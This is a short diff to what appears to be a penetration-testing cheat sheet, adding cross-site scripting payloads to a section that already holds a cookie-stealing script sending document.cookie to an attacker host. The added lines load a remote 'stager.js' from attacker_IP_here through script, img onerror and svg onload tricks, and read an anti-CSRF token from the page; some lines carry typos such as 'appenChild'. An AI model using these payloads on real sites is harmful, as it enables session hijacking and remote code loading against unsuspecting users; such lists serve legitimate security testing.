@@ -4267,6 +4267,14 @@ sudo python -m SimpleHTTPServer 80
 ## XSS payload to place on victim site
 <script>newImage().src="http://attacker_IP_here/cookie.php?c="document.cookie;</script>
 ## cookies get written to stolen_cookies.txt or observe traffic in wireshark
+
+# grab stager script
+<script src="http://attacker_IP_here/stager.js"></script>
+<img/onerror="var s=document.createElement('script');s.src='http://attacker_IP_here/stager.js'; document.getElementsByTagName('head')[0].appenChild(s);" src=a />
+<svg/onload=body.appendChild(document.createElement`script`).src='http://attacker_IP_here/stager.js' hidden />
+
+# steal anti-CSRF token from DOM
+<script>document.addEventListener("DOMContentLoaded",()=>alert(csrf.value))</script><link/rel="
 ```
 
 
